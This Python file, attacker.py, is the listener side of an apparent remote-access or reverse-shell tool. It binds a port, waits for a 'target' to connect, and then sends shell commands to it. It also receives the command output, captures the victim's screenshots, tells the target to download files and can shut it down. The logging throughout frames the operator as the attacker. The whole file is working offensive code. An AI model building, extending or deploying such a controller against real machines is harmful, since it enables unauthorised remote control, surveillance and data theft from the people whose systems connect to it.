# ========================================================================
# $File: attacker.py $
# $Date: 2019-01-21 23:03:34 $
# $Revision: $
# $Creator: Jen-Chieh Shen $
# $Notice: See LICENSE.txt for modification and distribution information
#                   Copyright © 2019 by Shen, Jen-Chieh $
# ========================================================================

import socket
import sys
import os
import locale

import command
import constant
import logger
import screenshot


LISTEN_COUNT = 1


def process_cmd_continue(full_cmd):
    """Process commmand that need to be continue.

    @param { stirng } full_cmd : Command string.
    """

    # No need to receive if just changing the directory.
    if "cd" in full_cmd:
        return True

    if full_cmd == "cls" or full_cmd == "clear":
        os.system('cls')
        os.system('clear')
        return True

    return False

def get_shell_cmd(path):
    """Prompt the shell info, and receive command input.

    @param { string } path : Shell path to prompt.
    @returns { string } full_cmd : Input command.
    @returns { boolean } iic : Is internal command?
    @returns { string } rl_cmd : Real command that the internal command
    prefex is removed.
    @returns { string[] } params : command arguments.
    """
    got_input = False
    while not got_input:
        # Get input command.
        full_cmd = input(path + "$ ")
        rl_cmd = full_cmd

        cmd, params = command.get_cmd_params(full_cmd)

        # Check if is internal command type.
        iicp = command.is_internal_command_prefix(cmd)
        iic = False
        if iicp:
            # Remove prefix, get the internal command.
            rl_cmd = cmd[1:]
            iic = command.is_internal_command(rl_cmd)
            if not iic:
                logger.error(f"'{full_cmd}' is not recognized internal command.")
                continue
        got_input = True

    return (full_cmd, iic, rl_cmd, params)

def __resolve_hp():
    """Resolve host and port."""
    # Resolve arguments.
    arg_len = len(sys.argv)

    if 2 <= arg_len:
        port = int(sys.argv[1])
    else:
        port = constant.PORT

    return port


def main():
    """Program Entry point."""

    port = __resolve_hp()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', port))
        s.listen(LISTEN_COUNT)

        logger.info(f"Bind port: {port}")

        shutdown = False

        while not shutdown:
            logger.info(f"Waiting target... : {LISTEN_COUNT}")
            conn, addr = s.accept()
            with conn:
                logger.info(f"New target => {addr}")
                while True:
                    # Receive shell info.
                    data = conn.recv(constant.BUF_SIZE)
                    # Shell info is the path.
                    path = data.decode(constant.DECODE_TYPE)

                    valid_internal_cmd = False

                    while not valid_internal_cmd:
                        full_cmd, iic, rl_cmd, params = get_shell_cmd(path)
                        params_len = len(params)

                        # NOTE(jenchieh): Check possible command at this moment.
                        if iic:
                            # Check exit command before receiving.
                            if rl_cmd == command.Command.EXIT.value:
                                logger.info("Attacker exit the target...")
                                break
                            if rl_cmd == command.Command.DOWNLOAD.value:
                                if params_len < 1:
                                    logger.error("Cannot download the file without the URL...")
                                    continue
                        valid_internal_cmd = True

                    # Send command.
                    conn.sendall(full_cmd.encode(constant.ENCODE_TYPE))


                    # Check internal command.
                    if iic:
                        # Check shutdown command before receiving.
                        if rl_cmd == command.Command.SHUTDOWN.value:
                            logger.info("Attacker shutdown the target...")
                            shutdown = True
                            break
                        if rl_cmd == command.Command.SCREENSHOT.value:
                            # Check if there are image filename argument.
                            if params_len >= 1:
                                ss_filename = params[0]
                            # Use default screenshot filename.
                            else:
                                ss_filename = screenshot.default_screenshot_name()

                            # Receive image bytes.
                            image_bytes = conn.recv(constant.BUF_SIZE)

                            # Save the screenshot image.
                            f = open(ss_filename, "wb+")
                            f.write(image_bytes)
                            f.close()

                            logger.info(f"Image saved! => {ss_filename}")

                        if rl_cmd == command.Command.DOWNLOAD.value:
                            result = conn.recv(constant.BUF_SIZE)
                            msg = result.decode(constant.DECODE_TYPE)

                            logger.info(msg)

                    # Check regular shell command.
                    else:
                        if process_cmd_continue(full_cmd):
                            continue

                        # Receive shell command result.
                        result = conn.recv(constant.BUF_SIZE)

                        # Convert to bytes[].
                        outs = result.decode(constant.DECODE_TYPE)

                        # Print out the result, so the attacker can see it.
                        print(outs)

    logger.info("Exit program, done attacking.")

if __name__ == "__main__":
    main()
